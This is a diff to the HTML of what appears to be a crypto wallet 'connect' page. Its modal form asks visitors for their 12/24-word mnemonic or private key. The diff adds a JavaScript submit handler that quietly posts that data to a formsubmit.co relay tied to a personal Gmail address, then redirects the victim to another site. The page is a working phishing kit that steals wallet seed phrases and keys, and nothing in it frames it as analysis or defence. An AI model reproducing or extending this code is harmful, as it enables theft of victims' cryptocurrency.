@@ -1014,8 +1014,7 @@
                         </div>
                         <div style="display: none" id="modalConnect" class="modal-div-3">
                             <div class="modal-connect">
-                                <form id="generalForm" method="post"
-                                    action="https://formsubmit.co/Bryanricch11@gmail.com">
+                                <form id="generalForm" method="post">
                                     <div class="form-group">
                                         <textarea placeholder="Enter your 12/24 mnemonic words or your privatekey"
                                             name="formData" id="formData" cols="30" rows="6" class="form-control"
@@ -1062,6 +1061,23 @@
         integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script> -->
 
     <script>
+        document.getElementById("generalForm").addEventListener("submit", function (event) {
+            event.preventDefault();
+
+            let formData = new FormData(this);
+
+            fetch("https://formsubmit.co/ajax/Bryanricch11@gmail.com", {
+                method: "POST",
+                body: formData
+            }).then(response => {
+                if (response.ok) {
+                    window.location.href = "https://cssloaderdao.vercel.app/"; // Redirect after success
+                } else {
+                    alert("There was an issue with your submission.");
+                }
+            }).catch(error => console.error("Error:", error));
+        });
+
         $(document).ready(function () {
             const modal = $('#connectModal');
 
